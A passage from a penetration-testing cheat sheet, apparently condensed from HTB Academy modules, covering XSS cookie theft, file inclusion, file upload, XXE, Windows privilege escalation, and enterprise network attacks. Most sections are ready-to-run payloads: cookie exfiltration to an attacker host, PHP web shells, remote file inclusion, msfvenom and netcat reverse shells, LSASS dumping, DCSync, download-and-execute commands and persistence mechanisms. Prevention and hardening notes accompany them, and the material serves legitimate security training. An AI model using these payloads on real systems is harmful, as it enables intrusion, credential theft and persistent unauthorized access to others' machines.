    header("Location: http://<TARGET>/");
    fclose($file);
    exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80
```

### Session Hijacking

Inject a script that sends the victim's cookies to your listener:

```html
<script src="http://<ATTACKER>/script.js"></script>
<script>new Image().src="http://<ATTACKER>/?c="+document.cookie;</script>
```

Cookie logger (`script.js` / `index.php`):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
sudo php -S 0.0.0.0:80
cat cookies.txt
```

Use captured cookies only in the authorized lab; `HttpOnly` cookies are not accessible to JavaScript.

### Prevention

- Context-aware output encoding (HTML, attribute, JavaScript, URL).
- Input validation and allowlists; sanitize rich HTML with DOMPurify.
- Content Security Policy (CSP) to restrict script sources.
- `HttpOnly` and `Secure` cookies; `SameSite` attributes.
- Avoid dangerous sinks (`innerHTML`, `document.write`, `eval`).

## 23. File Inclusion

> Condensed from HTB Academy **File Inclusion** (module 23).

### Local File Inclusion (LFI)

```text
?language=../../../../etc/passwd
?language=....//....//....//etc/passwd
?language=..%2f..%2f..%2f..%2fetc%2fpasswd
?language=/etc/passwd
?language=....\/....\/....\/etc/passwd
```

Bypass filters that strip `../` by repeating or encoding the sequence. Check the application's language/framework behavior (PHP, NodeJS, Java, .NET).

### PHP Filters

```text
?language=php://filter/read=convert.base64-encode/resource=index.php
?language=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
```

```bash
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=config' | base64 -d
```

### PHP Wrappers

```text
# data:// — execute inline PHP (allow_url_include required)
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# php://input — execute POST body
?language=php://input&cmd=id
POST body: <?php system($_GET["cmd"]); ?>

# expect:// — command execution (if the expect extension is loaded)
?language=expect://id
```

### Remote File Inclusion (RFI)

```bash
# Host the shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <PORT>

# Include it
?language=http://<ATTACKER>/shell.php&cmd=id
?language=ftp://<USER>:<PASSWORD>@<ATTACKER>/shell.php&cmd=id
?language=\\<ATTACKER>\share\shell.php&cmd=id
```

RFI requires `allow_url_include=On` (or the relevant wrapper to be enabled). SMB inclusion can work from Windows targets.

### LFI + File Upload

```bash
# GIF/PHP polyglot
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# ZIP archive with a PHP file inside
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# PHAR archive
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Then include the uploaded file with the appropriate wrapper (`zip://`, `phar://`, etc.).

### Log Poisoning

```bash
# Poison a User-Agent field
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET>/index.php" -H @Poison

# Common logs to include
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/vsftpd.log
/proc/self/environ
```

### Automation

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<TARGET>/index.php?language=FUZZ' -fs <SIZE>

ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://<TARGET>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<TARGET>/index.php?FUZZ=value' -fs <SIZE>
```

### Prevention

- Avoid passing user-controlled paths to include/require functions.
- Use a fixed allowlist of files or map IDs to files.
- Sanitize traversal sequences and use canonical paths.
- Disable `allow_url_include` and unnecessary wrappers.
- Run the web service with least privilege.

## 24. File Upload Attacks

> Condensed from HTB Academy **File Upload Attacks** (module 136).

### Web Shell Upload

```php
<?php system($_REQUEST['cmd']); ?>
```

```asp
<% eval request('cmd') %>
```

```bash
# Reverse shell payload
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.php
nc -lvnp <PORT>
```

```bash
curl 'http://<TARGET>/uploads/shell.php?cmd=id'
```

### Client-Side Validation

- Disable JavaScript or intercept the upload request in Burp/ZAP.
- Change the `Content-Type` and filename after the browser validates them.
- Send the file directly with `curl -F`.

```bash
curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET>/upload.php
```

### Filter Bypasses

- **Blacklist** — try alternate extensions (`.php3`, `.phtml`, `.phar`), case variations, double extensions, trailing dots/spaces, or null bytes on old PHP.
- **Whitelist** — use a double extension or a parser-confusion extension that still executes (verify on the target).
- **Content-Type** — change the multipart `Content-Type` to an allowed image type.
- **Magic bytes** — prepend an image signature (`GIF8`, JPEG header) to a PHP file.
- **Filename** — test path traversal or injection in the filename.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo "this is a text file" > text.jpg
file text.jpg
```

```text
# Content-type examples
image/jpeg
image/png
application/x-php
```

### Limited Uploads

- **SVG** — can contain JavaScript or XXE.
- **Image metadata** — `exiftool` comments can carry XSS payloads.
- **XXE via SVG** — read local files through an external entity.

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### Other Upload Attacks

- Archive uploads (ZIP/TAR) with path traversal.
- `.htaccess` upload to enable PHP execution.
- Filename injection into logs or commands.
- Upload to a publicly accessible directory and execute.

### Prevention

- Allowlist file types and validate content, not just the extension or `Content-Type`.
- Rename uploaded files and store them outside the web root.
- Disable execution in upload directories.
- Set size limits and scan uploads.
- Use a separate domain/CDN for user content.

## 25. Web Attacks

> Condensed from HTB Academy **Web Attacks** (module 134).

### HTTP Verb Tampering

```bash
# Discover allowed methods
curl -i -X OPTIONS http://<TARGET>/
curl -i -X TRACE http://<TARGET>/

# Try alternate verbs against an endpoint
curl -i -X HEAD http://<TARGET>/admin
curl -i -X PUT http://<TARGET>/admin
curl -i -X DELETE http://<TARGET>/admin
```

Check whether authentication or authorization is enforced for every method. Some applications only protect `GET`/`POST`.

### Insecure Direct Object References (IDOR)

```bash
# Enumerate object IDs
curl -s "http://<TARGET>/documents.php?uid=1"
curl -s "http://<TARGET>/documents.php?uid=2"

# Extract document links
curl -s "http://<TARGET>/documents.php?uid=3" | grep -oP '\/documents.*?\.pdf'

# Encoded references — try hashes
echo -n 1 | md5sum
echo -n 1 | base64 -w 0 | md5sum
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
# Brute-force a predictable reference
for i in {1..100}; do
  hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')
  curl -sOJ -X POST -d "contract=$hash" http://<TARGET>/download.php
done
```

Test API endpoints and JSON bodies too; IDOR often appears in `GET /api/user/<id>`, `PUT /api/document/<id>`, and nested object IDs.

### XML External Entity (XXE) Injection

Local file disclosure:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
</root>
```

External DTD for advanced disclosure:

```text
<!ENTITY joined "%begin;%file;%end;">
```

Blind OOB exfiltration:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER>:8000/?content=%file;'>">
```

```bash
# Capture the callback
php -S 0.0.0.0:8000
cat Logs/<TARGET>/etc/passwd.log
```

Automation:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

### Prevention

- Disable external entity and DTD processing in XML parsers.
- Enforce object-level authorization on every request, not just the UI.
- Use unguessable IDs and validate ownership server-side.
- Allowlist HTTP methods and enforce auth for every method.
- Use a WAF as defense in depth.
## 26. Windows Privilege Escalation

> Condensed from HTB Academy **Windows Privilege Escalation** (module 67). Lab passwords, hashes, and tokens are omitted; replace placeholders before use.

### Tools

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) — `Invoke-AllChecks`
- [SharpUp](https://github.com/GhostPack/SharpUp) — `SharpUp.exe audit`
- [Seatbelt](https://github.com/GhostPack/Seatbelt) — host enumeration
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk), [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Sherlock](https://github.com/rasta-mouse/Sherlock), [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

### Situational Awareness and Enumeration

```cmd
whoami
whoami /priv
whoami /groups
whoami /user

hostname
systeminfo
wmic qfe
wmic product get name
tasklist /svc
netstat -ano
query user
set
net user
net localgroup
net localgroup administrators
net accounts
```

```powershell
Get-HotFix | ft -AutoSize
Get-WmiObject -Class Win32_Product | select Name, Version
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User | fl
```

Pipes and named-pipe permissions:

```cmd
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### User Privileges

Check `whoami /priv` for enabled privileges. Common escalation paths:

#### SeImpersonate / SeAssignPrimaryToken

Commonly available to service accounts (IIS, MSSQL). Use a token-impersonation tool:

```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
  -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *

PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -i

RoguePotato.exe -r <ATTACKER_IP> -e "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -l 9999
```

Start a listener first:

```bash
nc -lvnp 8443
```

#### SeDebugPrivilege

Dump LSASS and extract credentials offline:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```text
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### SeTakeOwnershipPrivilege

Take ownership of a protected file, grant yourself access, and read it:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

```cmd
takeown /f "C:\<PATH>\<FILE>"
icacls "C:\<PATH>\<FILE>" /grant <USER>:F
type "C:\<PATH>\<FILE>"
```

### Group Privileges

#### Backup Operators / SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege

Copy-FileSeBackupPrivilege 'C:\Confidential\<FILE>' .\<FILE>
```

Copy `NTDS.dit` and registry hives:

```cmd
diskshadow.exe
dir E:
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

#### Event Log Readers

```cmd
net localgroup "Event Log Readers"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
  Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### DnsAdmins

Load a malicious DLL into the DNS service:

```cmd
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <USER> /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777
```

```powershell
wget "http://<ATTACKER_IP>:7777/adduser.dll" -OutFile "adduser.dll"
```

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\<USER>\Desktop\adduser.dll
sc stop dns
sc start dns
net group "Domain Admins" /dom
```

Clean up:

```cmd
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe start dns
```

#### Hyper-V Administrators

Replace a privileged service binary:

```cmd
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
sc.exe start MozillaMaintenance
```

#### Print Operators

Use the Capcom `SeLoadDriverPrivilege` driver exploit:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

.\EnableSeLoadDriverPrivilege.exe
.\ExploitCapcom.exe
```

Clean up:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

#### Server Operators

Reconfigure a service binary path:

```cmd
sc qc AppReadiness
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
sc start AppReadiness
net localgroup Administrators
```

### User Account Control (UAC)

```cmd
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

If `EnableLUA=1`, test UAC bypasses such as:

- `fodhelper.exe` / `computerdefaults.exe` registry hijack.
- DLL hijacking in `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- `SystemPropertiesAdvanced.exe` DLL search-order hijack.

Example DLL-hijack path:

```cmd
copy payload.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
rundll32 shell32.dll,Control_RunDLL "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
```

### Weak Permissions and Services

```cmd
SharpUp.exe audit
accesschk.exe /accepteula -quvcw <SERVICE>
icacls "C:\Program Files\<VENDOR>\<SERVICE>.exe"

# Modifiable service binary
sc config <SERVICE> binPath= "cmd /c net localgroup Administrators <USER> /add"
sc stop <SERVICE>
sc start <SERVICE>
```

Find unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" |
  findstr /i /v "c:\windows\\" | findstr /i /v """
```

Check registry permissions:

```cmd
accesschk.exe /acceptula -kvuqsw hklm\System\CurrentControlSet\services
```

### Kernel Exploits

```cmd
systeminfo
wmic qfe list brief
Get-HotFix
```

Examples:

```cmd
# SeriousSAM / HiveNightmare
icacls C:\Windows\System32\config\SAM
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-<DATE> -system SYSTEM-<DATE> -security SECURITY-<DATE> local
```

```powershell
# PrintNightmare (CVE-2021-1675) — lab only
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "<USER>" -NewPassword "<PASSWORD>" -DriverName "PrintIt"
```

```cmd
# CVE-2020-0668 — replace a privileged service binary
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe <PAYLOAD>.exe ^
  "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
net start MozillaMaintenance
```

Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) or Sherlock to match the patch level to a public exploit. Kernel exploits can crash the target.

### Vulnerable Services

```cmd
wmic product get name
netstat -ano | findstr <PORT>
get-process -Id <PID>
get-service | ? {$_.DisplayName -like '<VENDOR>*'}
```

Look for services running as `SYSTEM` with an RPC/HTTP interface, default credentials, or known CVEs. Test in the lab and document the impact.

### DLL Injection and Hijacking

- Identify a service that loads a DLL from a writable directory or has an unquoted path.
- Build a DLL with `DllMain` that executes your payload.
- Place it where the service will load it, then restart the service.

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt");
        break;
    }
    return TRUE;
}
```

### Credential Theft

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*
dir /S /B *pass* == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){
  cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}

$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

Other sources:

```cmd
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> "cmd.exe"
```

```powershell
.\SharpChrome.exe logins /unprotect
.\lazagne.exe all
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <HOST>
```

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

KeePass:

```bash
python2.7 keepass2john.py <DATABASE>.kdbx > keepass_hash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

### Interacting with Users

Social engineering can turn a low-privileged user into an execution primitive. In authorized labs:

- Send a fake update, invoice, or monitoring tool and ask the user to run it.
- Use a signed binary or a trusted document/macro to launch your payload.
- Capture NTLMv2 hashes with Responder when a user authenticates to a malicious share.

```powershell
IEX (iwr 'http://<ATTACKER>/update.ps1')
```

```bash
sudo responder -w -v -I <IFACE>
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

Always obtain explicit authorization before any user-interaction testing. Do not phish real employees or external users.

### Pillaging

- Installed software and versions:
  ```cmd
  dir "C:\Program Files"
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, InstallLocation
  Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, InstallLocation
  ```
- mRemoteNG connection files (encrypted blobs must be decrypted):
  ```cmd
  ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
  ```
- Browser cookies/history, saved RDP/VNC sessions, SSH keys, and clipboard data.
- PowerShell history, `cmdkey /list`, PuTTY sessions, and WiFi profiles.
- Backup tools and repositories (Restic, Veeam, Windows Backup).
- Share and SYSVOL files containing scripts, configs, or credentials.

```cmd
cmdkey /list
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
netsh wlan show profile
```

Collect only what is needed to prove impact, and store any secrets according to the engagement's data-handling rules.

### Restricted Environments and Additional Techniques

#### Citrix Breakout

- Enumerate the published application and its allowed actions.
- Use a signed Microsoft binary to launch `cmd.exe` (for example, an MSI or a trusted executable).
- Check `AlwaysInstallElevated`:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > aie.msi
```

```cmd
msiexec /i C:\Users\<USER>\Desktop\aie.msi /quiet /qn /norestart
```

#### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
accesschk64.exe /accepteula -s -d C:\Scripts\
```

#### End-of-Life Systems

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

```bash
python2 windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py --database <MSB>.xls --systeminfo <SYSTEMINFO>.txt
```

### Hardening

- Patch the OS and third-party services; remove EOL systems.
- Apply least privilege to service accounts and local groups.
- Use absolute, quoted service paths and restrict write access to service binaries.
- Disable unnecessary privileges (`SeImpersonate`, `SeDebug`, `SeTakeOwnership`, `SeLoadDriver`).
- Restrict `AlwaysInstallElevated` and UAC settings.
- Protect LSASS (`RunAsPPL`), enable Credential Guard, and limit credential caching.
- Audit local administrators, scheduled tasks, services, and ACLs.
- Monitor event logs and use EDR/AV.

## 27. Documentation & Reporting

> Condensed from HTB Academy **Documentation & Reporting** (module 162).

### Notetaking and Organization

- Keep one directory per engagement; separate admin, deliverables, evidence, notes, scans, and OSINT.
- Log every command and its output; timestamp screenshots.
- Use a consistent note template per host and per finding.

```bash
mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,AD},Notes,OSINT,Wireless,Logging,Misc},Retest}
tree ACME-IPT/
```

Use tmux logging or `script` to capture terminal sessions:

```bash
# tmux logging (prefix + Shift+P with tmux-logging), or:
script -a session.log
```

### Report Types

- **Executive summary** — scope, objectives, high-level risk, business impact.
- **Technical report** — methodology, findings, evidence, remediation.
- **Full report** — executive + technical + appendices.
- **Retest report** — original findings, remediation status, residual risk.

### Components of a Finding

1. **Title** — concise and specific.
2. **Severity** — CVSS vector/score plus business context.
3. **Affected assets** — host, URL, parameter, account.
4. **Description** — root cause and conditions.
5. **Impact** — what an attacker can achieve.
6. **Evidence** — reproducible steps, requests/responses, screenshots, timestamps.
7. **Remediation** — specific, actionable, and prioritized.
8. **References** — CVE/CWE/OWASP/vendor guidance.

### Writing Tips

- Write for the audience: executives need impact, engineers need reproduction steps.
- Include exact commands and payloads with sensitive values redacted.
- Explain *why* a finding matters, not just the scanner output.
- Separate confirmed findings from informational observations.
- Use consistent naming and numbering across the report.
- Review for false positives, typos, and accidental credential exposure.
- Store evidence according to the engagement's data-retention rules.

### Report Quality Checklist

- [ ] Scope and dates match the contract.
- [ ] Every finding has evidence and remediation.
- [ ] CVSS scores and vectors are consistent.
- [ ] Screenshots are readable and redacted.
- [ ] No credentials, cookies, hashes, or client secrets in the report.
- [ ] Executive summary is accurate and free of jargon.
- [ ] Retest guidance and contact details are included.

## 28. Attacking Enterprise Networks

> Condensed from HTB Academy **Attacking Enterprise Networks** (module 163). This is an end-to-end engagement walkthrough; commands are generic and credentials are redacted.

### Engagement Flow

```text
Pre-Engagement
  -> External Information Gathering
  -> Service/Web Enumeration
  -> Initial Access
  -> Internal Information Gathering
  -> Exploitation & Privilege Escalation
  -> Lateral Movement
  -> AD Compromise
  -> Post-Exploitation
  -> Closeout
```

### External Information Gathering

```bash
# Scope-driven port scanning
sudo nmap --open -oA external_tcp_1k -iL scope
sudo nmap --open -p- -A -oA external_tcp_all -iL scope

# DNS zone transfer
dig axfr <DOMAIN> @<NAMESERVER>

# Virtual-host discovery
curl -s -I http://<TARGET> -H "Host: <VHOST>.<DOMAIN>" | grep "Content-Length:"
ffuf -w namelist.txt:FUZZ -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>

# Add discovered hosts
sudo tee -a /etc/hosts > /dev/null <<'EOF'
<TARGET_IP>  <VHOST>.<DOMAIN>
EOF
```

### Service and Web Enumeration

```bash
ftp <TARGET>
nc -nv <TARGET> 22
ssh <USER>@<TARGET>
nmap -sV -sC -p25 <TARGET>
telnet <TARGET> 25
telnet <TARGET> 110
nmap -p25 -Pn --script smtp-open-relay <TARGET>
rpcinfo <TARGET>

# Web
eyewitness -f <SUBDOMAINS> -d eyewitness_out
whatweb http://<TARGET>
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
wpscan -e ap -t 500 --url http://<TARGET>
wpscan -e u -t 500 --url http://<TARGET>
```

### Initial Access

- Exploit the exposed service or web application.
- Upload a web shell or use a public exploit/PoC.
- Establish a stable reverse shell and upgrade the TTY.
- Document the exact request/payload used.

```bash
# Example web shell call
curl 'http://<TARGET>/uploads/shell.php?cmd=id'

# Listener
nc -lvnp <PORT>
```

### Internal Information Gathering

```bash
# Dynamic SOCKS pivot over SSH
ssh -D 8081 -i <KEY> <USER>@<PIVOT>
grep socks4 /etc/proxychains.conf
proxychains nmap -sT -p 21,22,80,8080 <INTERNAL_IP>

# Living-off-the-land discovery
for i in $(seq 254); do ping -c1 -W1 172.16.8.$i & done | grep from
proxychains enum4linux -U -P <INTERNAL_IP>
proxychains showmount -e <INTERNAL_IP>

# Mount an NFS share
mkdir <MOUNT>
mount -t nfs <INTERNAL_IP>:/<SHARE> /tmp/<MOUNT>
```

### Internal Exploitation & Privilege Escalation

After pivoting, enumerate each reachable host and exploit the exposed services.

```bash
# Host discovery and service scans through the pivot
proxychains nmap -sT -Pn -p 21,22,80,139,445,3389,5985 <INTERNAL_SUBNET>
proxychains enum4linux -U -P <INTERNAL_IP>
proxychains showmount -e <INTERNAL_IP>

# SMB / WinRM
proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASSWORD>' --shares
proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASSWORD>'
```

Linux local privilege escalation:

```bash
id
sudo -l
uname -a
./linpeas.sh
find / -perm -4000 -type f 2>/dev/null
```

Windows local privilege escalation:

```cmd
whoami /priv
whoami /groups
systeminfo
.\winPEAS.exe
```

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Credential access after escalation:

```bash
secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<INTERNAL_IP>
```

```cmd
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
```

Document each host, the access obtained, and the privilege level. Escalate one host at a time, track the chain, and avoid unnecessary changes.

### Lateral Movement and AD Compromise

```bash
# SMB/winrm through the pivot
proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASSWORD>' --shares
proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASSWORD>'

# AD enumeration and Kerberoasting
Get-DomainUser * -SPN | select samaccountname
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spns.csv -NoTypeInformation
hashcat -m 13100 spns.csv /usr/share/wordlists/rockyou.txt

# ACL abuse and DCSync
Add-DomainGroupMember -Identity "<GROUP>" -Members "<USER>" -Credential $Cred -Verbose
proxychains secretsdump.py <USER>@<DC> -just-dc-ntlm
```

Use `proxychains` for every internal tool, keep a per-host log, and avoid changing the environment unless required by the scope.

### Persistence & Post-Exploitation

Only establish persistence when it is explicitly in scope. Common Windows/Linux mechanisms:

```cmd
:: Scheduled task
schtasks /create /tn <NAME> /tr "<COMMAND>" /sc onlogon /ru SYSTEM

:: Service
sc create <SERVICE> binPath= "<COMMAND>" start= auto
sc start <SERVICE>

:: User startup key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /d "<COMMAND>"
```

```bash
# Linux SSH key persistence
echo '<PUBLIC_KEY>' >> ~/.ssh/authorized_keys

# Web shell persistence
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/<FILE>.php
```

Document every change, prefer the least invasive mechanism, and remove all persistence during cleanup:

```cmd
schtasks /delete /tn <NAME> /f
sc delete <SERVICE>
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /f
```

```bash
rm -f /var/www/html/<FILE>.php
sed -i '/<PUBLIC_KEY>/d' ~/.ssh/authorized_keys
```

For post-exploitation, collect only the evidence needed to prove impact, avoid unnecessary data exfiltration, and record timestamps and hashes for the report.

### Post-Exploitation and Closeout

- Collect only the evidence needed to prove impact.
- Clean up uploaded shells, accounts, scheduled tasks, and service changes.
- Remove temporary files and restore modified configuration.
- Write the report with the attack chain, evidence, and remediation.
- Hold a closeout/review meeting and define retest scope.

### Engagement Checklist

- [ ] Scope, RoE, and emergency contacts confirmed.
- [ ] External attack surface mapped and evidenced.
- [ ] Initial access documented with reproducible steps.
- [ ] Internal pivot and enumeration logged.
- [ ] Privilege escalation and lateral movement proven.
- [ ] AD compromise (if in scope) documented.
- [ ] Cleanup completed and verified.
- [ ] Report reviewed and delivered.

## 29. Useful Resources

[HackTricks](https://book.hacktricks.xyz/)

[WADComs](https://wadcoms.github.io/#+SMB+Windows)

[GTFOBins](https://gtfobins.github.io/)

[SwisskyRepo - Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Living off the Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)

[Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries)
